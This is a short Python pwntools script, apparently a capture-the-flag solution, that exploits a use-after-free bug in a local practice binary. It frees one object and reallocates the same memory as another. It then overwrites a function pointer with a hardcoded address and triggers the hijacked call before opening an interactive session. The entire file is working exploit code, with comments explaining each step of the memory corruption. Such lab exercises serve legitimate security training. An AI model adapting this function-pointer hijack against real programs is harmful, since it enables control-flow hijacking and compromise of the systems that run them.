from pwn import *

# context.log_level = 'debug' # Uncomment for detailed logs

p = process('./uaf')

# The program prints a menu and waits for input.
# We can wait for a part of the menu to ensure the program is ready.
# Let's use a part of the menu as the prompt.
prompt = b"8. hi woman"

# 1. free(p1)
p.sendlineafter(prompt, b'5')

# 2. malloc(p2) -> p1 and p2 point to the same memory
p.sendlineafter(prompt, b'8')

# 3. Overwrite p1->ptr by writing to p2->name
# In the 'woman' struct, 'name' comes first.
# In the 'man' struct, 'ptr' comes first.
# So, writing to p2->name overwrites p1->ptr.
p.sendlineafter(prompt, b'4')

# The program is now at read(). Send the address of ironman_introduce.
ironman_introduce_addr = 0x401204
payload = p64(ironman_introduce_addr)
p.sendline(payload)

# 4. Call p1->ptr(), which now points to ironman_introduce()
p.sendlineafter(prompt, b'1')

p.interactive()